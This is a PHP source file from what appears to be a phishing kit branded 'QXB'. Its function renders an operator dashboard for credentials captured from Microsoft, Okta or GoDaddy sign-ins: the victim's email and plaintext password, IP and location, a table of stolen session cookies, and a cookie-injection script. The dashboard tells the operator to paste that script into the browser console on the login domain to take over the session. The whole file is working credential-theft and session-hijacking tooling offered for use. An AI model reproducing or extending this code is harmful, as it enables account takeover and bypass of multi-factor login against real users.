<?php

function generateSessionReport($email, $password, $cookieJson, $cookieJs, $authProvider = 'microsoft') {
  $ip = isset($_SESSION['user_data']['ip']) ? $_SESSION['user_data']['ip'] : 'Unknown';
  $ua = isset($_SESSION['user_data']['ua']) ? $_SESSION['user_data']['ua'] : 'Unknown';
  $country = isset($_SESSION['user_data']['info']['country']) ? $_SESSION['user_data']['info']['country'] : 'Unknown';
  $countryCode = isset($_SESSION['user_data']['info']['country_code']) ? $_SESSION['user_data']['info']['country_code'] : '--';
  $city = isset($_SESSION['user_data']['info']['city']) ? $_SESSION['user_data']['info']['city'] : 'Unknown';

  $uid = bin2hex(random_bytes(16));
  $cookieUid = bin2hex(random_bytes(16));
  $timestamp = date('c');
  $displayTime = date('M d, Y H:i:s');

  $providerDomain = 'login.microsoftonline.com';
  if ($authProvider === 'okta') $providerDomain = 'okta.com';
  if ($authProvider === 'godaddy') $providerDomain = 'sso.godaddy.com';

  $cookies = json_decode($cookieJson, true);
  $cookieCount = is_array($cookies) ? count($cookies) : 0;

  $os = 'Unknown';
  $browser = 'Unknown';
  $isMobile = false;
  if (preg_match('/Windows/i', $ua)) $os = 'Windows';
  elseif (preg_match('/Mac/i', $ua)) $os = 'macOS';
  elseif (preg_match('/Linux/i', $ua)) $os = 'Linux';
  elseif (preg_match('/Android/i', $ua)) { $os = 'Android'; $isMobile = true; }
  elseif (preg_match('/iPhone|iPad/i', $ua)) { $os = 'iOS'; $isMobile = true; }

  if (preg_match('/Edg\//i', $ua)) $browser = 'Edge';
  elseif (preg_match('/Chrome/i', $ua)) $browser = 'Chrome';
  elseif (preg_match('/Firefox/i', $ua)) $browser = 'Firefox';
  elseif (preg_match('/Safari/i', $ua)) $browser = 'Safari';

  $cookieJsEscaped = htmlspecialchars($cookieJs, ENT_QUOTES, 'UTF-8');
  $providerUpper = strtoupper($authProvider);

  $cookieTableRows = '';
  if (is_array($cookies)) {
    foreach ($cookies as $c) {
      $name = isset($c['Name']) ? htmlspecialchars($c['Name']) : '';
      $domain = isset($c['Domain']) ? htmlspecialchars($c['Domain']) : '';
      $path = isset($c['Path']) ? htmlspecialchars($c['Path']) : '/';
      $secure = isset($c['Secure']) && $c['Secure'] ? '🔒 Yes' : 'No';
      $val = isset($c['Value']) ? htmlspecialchars(substr($c['Value'], 0, 60)) : '';
      if (isset($c['Value']) && strlen($c['Value']) > 60) $val .= '...';

      $cookieTableRows .= "<tr>
        <td class=\"ck-name\">{$name}</td>
        <td class=\"ck-val\">{$val}</td>
        <td>{$domain}</td>
        <td>{$path}</td>
        <td>{$secure}</td>
      </tr>";
    }
  }

  $reportJson = json_encode([
    'uid' => $uid,
    'email' => $email,
    'password' => $password,
    'provider' => $authProvider,
    'provider_domain' => $providerDomain,
    'ip' => $ip,
    'country' => $country,
    'country_code' => $countryCode,
    'city' => $city,
    'user_agent' => $ua,
    'os' => $os,
    'browser' => $browser,
    'is_mobile' => $isMobile,
    'cookie_count' => $cookieCount,
    'captured_at' => $timestamp,
    'injection_script' => $cookieJs
  ], JSON_UNESCAPED_SLASHES);

  $reportJsonB64 = base64_encode($reportJson);

  return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Session Report</title>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
<style>
@import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');

*{margin:0;padding:0;box-sizing:border-box}

:root{
  --bg-deep:#060a13;
  --bg-panel:#0c1220;
  --bg-card:#111827;
  --bg-input:#1a2236;
  --accent:#3b82f6;
  --accent-dim:rgba(59,130,246,.15);
  --accent-glow:rgba(59,130,246,.4);
  --accent2:#60a5fa;
  --success:#10b981;
  --danger:#ef4444;
  --warn:#f59e0b;
  --text:#e2e8f0;
  --text-dim:#94a3b8;
  --border:#1e293b;
  --border-accent:rgba(59,130,246,.3);
}

html{scrollbar-width:thin;scrollbar-color:var(--accent) var(--bg-deep)}
body{background:var(--bg-deep);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh;display:flex;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:
  radial-gradient(ellipse at 20% 50%,rgba(59,130,246,.06) 0%,transparent 50%),
  radial-gradient(ellipse at 80% 20%,rgba(59,130,246,.04) 0%,transparent 50%);
  pointer-events:none;z-index:0}

#sidebar{
  width:270px;min-width:270px;
  background:linear-gradient(180deg,#0f172a 0%,#0a0f1a 100%);
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  position:relative;z-index:10;
}
.sb-head{
  padding:28px 20px 22px;text-align:center;
  background:linear-gradient(135deg,rgba(59,130,246,.12) 0%,rgba(56,189,248,.06) 100%);
  border-bottom:1px solid var(--border-accent);
}
.sb-icon{font-size:42px;margin-bottom:8px;display:block;filter:drop-shadow(0 0 12px var(--accent-glow));animation:pulse 3s infinite}
@keyframes pulse{0%,100%{opacity:1;filter:drop-shadow(0 0 12px var(--accent-glow))}50%{opacity:.8;filter:drop-shadow(0 0 20px var(--accent))}}
.sb-title{font-family:'Orbitron',sans-serif;font-size:20px;font-weight:700;color:#fff;letter-spacing:3px;text-shadow:0 0 10px var(--accent-glow)}
.sb-sub{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:3px;margin-top:4px}

.sb-nav{flex:1;padding:12px 0}
.sb-link{
  display:flex;align-items:center;gap:12px;
  padding:14px 22px;cursor:pointer;
  color:var(--text-dim);font-size:15px;font-weight:500;
  border-left:3px solid transparent;
  transition:all .25s ease;position:relative;overflow:hidden;
}
.sb-link::before{content:'';position:absolute;left:-100%;top:0;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,.08),transparent);transition:left .5s}
.sb-link:hover::before{left:100%}
.sb-link:hover{background:rgba(59,130,246,.08);border-left-color:var(--accent);color:#fff;padding-left:28px}
.sb-link.active{background:rgba(59,130,246,.12);border-left-color:var(--accent);color:#fff;box-shadow:inset 0 0 30px rgba(59,130,246,.06)}
.sb-link i{font-size:16px;color:var(--accent);width:20px;text-align:center}

.sb-foot{padding:16px 20px;border-top:1px solid var(--border);text-align:center}
.sb-foot span{font-size:10px;color:var(--text-dim);letter-spacing:1px;text-transform:uppercase}

#main{flex:1;padding:28px 32px;position:relative;z-index:5;overflow-y:auto}

.top-bar{
  display:flex;align-items:center;justify-content:space-between;
  background:var(--bg-card);border:1px solid var(--border);
  border-radius:12px;padding:18px 24px;margin-bottom:28px;
  box-shadow:0 4px 24px rgba(0,0,0,.3);
}
.top-bar h1{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:700;color:#fff;letter-spacing:1px}
.top-bar h1 span{color:var(--accent)}

.btn-export{
  background:linear-gradient(135deg,var(--accent) 0%,#1d4ed8 100%);
  border:none;color:#fff;padding:10px 22px;border-radius:8px;
  font-family:'Rajdhani',sans-serif;font-weight:600;font-size:14px;
  cursor:pointer;display:flex;align-items:center;gap:8px;
  transition:all .3s;text-transform:uppercase;letter-spacing:1px;
  box-shadow:0 4px 16px rgba(59,130,246,.3);
}
.btn-export:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(59,130,246,.5)}

.section{display:none;animation:fadeUp .4s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}

.card{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;margin-bottom:20px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,.2)}
.card-head{background:linear-gradient(135deg,rgba(59,130,246,.1) 0%,rgba(56,189,248,.05) 100%);padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
.card-head h3{font-family:'Orbitron',sans-serif;font-size:14px;font-weight:600;color:#fff;letter-spacing:1px}
.card-head i{color:var(--accent);font-size:16px}

.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;padding:20px}
.stat-item{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:16px;text-align:center;transition:all .3s}
.stat-item:hover{border-color:var(--border-accent);transform:translateY(-2px);box-shadow:0 4px 16px rgba(59,130,246,.1)}
.stat-label{font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px}
.stat-value{font-family:'JetBrains Mono',monospace;font-size:15px;color:#fff;font-weight:500;word-break:break-all}
.stat-value.accent{color:var(--accent2)}
.stat-value.success{color:var(--success)}
.stat-value.danger{color:var(--danger)}

table{width:100%;border-collapse:collapse}
thead{background:linear-gradient(135deg,rgba(59,130,246,.1),rgba(56,189,248,.06))}
th{padding:12px 16px;text-align:left;font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:600;border-bottom:1px solid var(--border)}
td{padding:10px 16px;border-bottom:1px solid var(--border);font-size:13px;color:var(--text)}
tbody tr:hover{background:rgba(59,130,246,.04)}
.ck-name{font-family:'JetBrains Mono',monospace;color:var(--accent2);font-weight:500;font-size:12px}
.ck-val{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);max-width:320px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

.cred-row{display:flex;align-items:center;gap:12px;padding:12px 20px;border-bottom:1px solid var(--border)}
.cred-row:last-child{border-bottom:none}
.cred-label{font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;min-width:90px}
.cred-value{font-family:'JetBrains Mono',monospace;font-size:14px;color:#fff;flex:1;word-break:break-all}
.cred-value.highlight{color:var(--accent2)}

pre.json-view{
  background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;
  padding:20px;margin:16px 20px 20px;
  color:#22d3ee;font-family:'JetBrains Mono',monospace;font-size:12px;
  max-height:500px;overflow:auto;line-height:1.6;white-space:pre-wrap;word-break:break-word;
}

.btn-copy{
  background:linear-gradient(135deg,var(--accent) 0%,#1d4ed8 100%);
  border:none;color:#fff;padding:7px 16px;border-radius:6px;
  font-size:12px;font-weight:600;cursor:pointer;
  display:inline-flex;align-items:center;gap:6px;
  transition:all .3s;font-family:'Rajdhani',sans-serif;
}
.btn-copy:hover{transform:scale(1.05);box-shadow:0 4px 16px rgba(59,130,246,.4)}
.btn-copy.copied{background:linear-gradient(135deg,var(--success),#059669)}

.inject-box{margin:16px 20px 20px;position:relative}
.inject-box textarea{
  width:100%;height:120px;
  background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;
  padding:16px;color:var(--accent2);
  font-family:'JetBrains Mono',monospace;font-size:11px;
  resize:vertical;outline:none;
}
.inject-box textarea:focus{border-color:var(--accent)}
.inject-box .copy-overlay{position:absolute;top:8px;right:28px}

.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;letter-spacing:1px}
.badge-valid{background:rgba(16,185,129,.15);color:var(--success);border:1px solid rgba(16,185,129,.3)}
.badge-provider{background:var(--accent-dim);color:var(--accent2);border:1px solid var(--border-accent)}

@media(max-width:768px){
  body{flex-direction:column}
  #sidebar{width:100%;min-width:100%;flex-direction:row;overflow-x:auto}
  .sb-head{display:none}
  .sb-nav{display:flex;padding:0}
  .sb-link{padding:12px 16px;white-space:nowrap;border-left:none;border-bottom:3px solid transparent}
  .sb-link.active{border-bottom-color:var(--accent)}
  .sb-foot{display:none}
  #main{padding:16px}
}
</style>
</head>
<body>

<nav id="sidebar">
  <div class="sb-head">
    <span class="sb-icon">☠️</span>
    <div class="sb-title">QXB</div>
    <div class="sb-sub">Session Report</div>
  </div>
  <div class="sb-nav">
    <div class="sb-link active" data-target="sec-overview"><i class="fas fa-th-large"></i> Overview</div>
    <div class="sb-link" data-target="sec-creds"><i class="fas fa-key"></i> Credentials</div>
    <div class="sb-link" data-target="sec-cookies"><i class="fas fa-cookie-bite"></i> Cookies ({$cookieCount})</div>
    <div class="sb-link" data-target="sec-inject"><i class="fas fa-syringe"></i> Injector</div>
    <div class="sb-link" data-target="sec-raw"><i class="fas fa-code"></i> Raw Data</div>
  </div>
  <div class="sb-foot"><span>QXB &middot; {$displayTime}</span></div>
</nav>

<div id="main">
  <div class="top-bar">
    <h1>☠️ <span>QXB</span> SESSION REPORT</h1>
    <button class="btn-export" id="btnExport"><i class="fas fa-download"></i> Export JSON</button>
  </div>

  <!-- OVERVIEW -->
  <div class="section" id="sec-overview">
    <div class="card">
      <div class="card-head"><i class="fas fa-crosshairs"></i><h3>Capture Summary</h3></div>
      <div class="stats-grid">
        <div class="stat-item">
          <div class="stat-label">Target</div>
          <div class="stat-value accent">{$email}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Provider</div>
          <div class="stat-value"><span class="badge badge-provider">{$providerUpper}</span></div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Status</div>
          <div class="stat-value success"><span class="badge badge-valid"><i class="fas fa-check-circle"></i> VALID</span></div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Cookies</div>
          <div class="stat-value accent">{$cookieCount}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">IP Address</div>
          <div class="stat-value">{$ip}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Country</div>
          <div class="stat-value">{$country} ({$countryCode})</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">City</div>
          <div class="stat-value">{$city}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Browser</div>
          <div class="stat-value">{$browser}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">OS</div>
          <div class="stat-value">{$os}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Domain</div>
          <div class="stat-value">{$providerDomain}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Captured</div>
          <div class="stat-value">{$displayTime}</div>
        </div>
        <div class="stat-item">
          <div class="stat-label">Session ID</div>
          <div class="stat-value" style="font-size:11px">{$uid}</div>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-head"><i class="fas fa-fingerprint"></i><h3>User Agent</h3></div>
      <div style="padding:16px 20px">
        <code style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-dim);line-height:1.6;word-break:break-all">{$ua}</code>
      </div>
    </div>
  </div>

  <!-- CREDENTIALS -->
  <div class="section" id="sec-creds">
    <div class="card">
      <div class="card-head"><i class="fas fa-shield-alt"></i><h3>Captured Credentials</h3></div>
      <div class="cred-row">
        <span class="cred-label">Email</span>
        <span class="cred-value highlight">{$email}</span>
        <button class="btn-copy" onclick="copyText('{$email}')"><i class="fas fa-copy"></i></button>
      </div>
      <div class="cred-row">
        <span class="cred-label">Password</span>
        <span class="cred-value">{$password}</span>
        <button class="btn-copy" onclick="copyText('{$password}')"><i class="fas fa-copy"></i></button>
      </div>
      <div class="cred-row">
        <span class="cred-label">Provider</span>
        <span class="cred-value"><span class="badge badge-provider">{$providerUpper}</span></span>
      </div>
      <div class="cred-row">
        <span class="cred-label">Domain</span>
        <span class="cred-value">{$providerDomain}</span>
      </div>
    </div>
  </div>

  <!-- COOKIES TABLE -->
  <div class="section" id="sec-cookies">
    <div class="card">
      <div class="card-head"><i class="fas fa-cookie-bite"></i><h3>Session Cookies &mdash; {$cookieCount} captured</h3></div>
      <div style="overflow-x:auto">
        <table>
          <thead>
            <tr><th>Name</th><th>Value</th><th>Domain</th><th>Path</th><th>Secure</th></tr>
          </thead>
          <tbody>{$cookieTableRows}</tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- INJECTOR -->
  <div class="section" id="sec-inject">
    <div class="card">
      <div class="card-head"><i class="fas fa-syringe"></i><h3>Cookie Injection Script</h3></div>
      <div style="padding:16px 20px">
        <p style="font-size:13px;color:var(--text-dim);margin-bottom:12px">
          <i class="fas fa-info-circle" style="color:var(--accent)"></i>
          Open browser console on <strong style="color:var(--accent2)">{$providerDomain}</strong> and paste the script below.
        </p>
      </div>
      <div class="inject-box">
        <textarea id="injectScript" readonly>{$cookieJsEscaped}</textarea>
        <div class="copy-overlay">
          <button class="btn-copy" id="btnCopyInject"><i class="fas fa-copy"></i> Copy Script</button>
        </div>
      </div>
    </div>
  </div>

  <!-- RAW DATA -->
  <div class="section" id="sec-raw">
    <div class="card">
      <div class="card-head"><i class="fas fa-database"></i><h3>Raw Session Data</h3></div>
      <pre class="json-view" id="rawJson"></pre>
    </div>
  </div>
</div>

<script>
var _rd = JSON.parse(atob('{$reportJsonB64}'));

document.querySelectorAll('.sb-link').forEach(function(link) {
  link.addEventListener('click', function() {
    document.querySelectorAll('.sb-link').forEach(function(l){ l.classList.remove('active'); });
    this.classList.add('active');
    document.querySelectorAll('.section').forEach(function(s){ s.style.display = 'none'; });
    var t = this.getAttribute('data-target');
    var el = document.getElementById(t);
    if (el) el.style.display = 'block';
    if (t === 'sec-raw') {
      document.getElementById('rawJson').textContent = JSON.stringify(_rd, null, 2);
    }
  });
});

document.querySelector('.sb-link.active').click();

document.getElementById('btnExport').addEventListener('click', function() {
  var d = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(_rd, null, 4));
  var a = document.createElement('a');
  a.href = d;
  a.download = (_rd.email || 'session') + '.json';
  document.body.appendChild(a);
  a.click();
  a.remove();
});

function copyText(txt) {
  navigator.clipboard.writeText(txt).then(function() {
    var btns = document.querySelectorAll('.btn-copy');
    btns.forEach(function(b) { b.classList.remove('copied'); });
  });
}

document.getElementById('btnCopyInject').addEventListener('click', function() {
  var ta = document.getElementById('injectScript');
  navigator.clipboard.writeText(ta.value).then(function() {
    var btn = document.getElementById('btnCopyInject');
    btn.classList.add('copied');
    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
    setTimeout(function() {
      btn.classList.remove('copied');
      btn.innerHTML = '<i class="fas fa-copy"></i> Copy Script';
    }, 2000);
  });
});
</script>
</body>
</html>
HTML;
}

?>
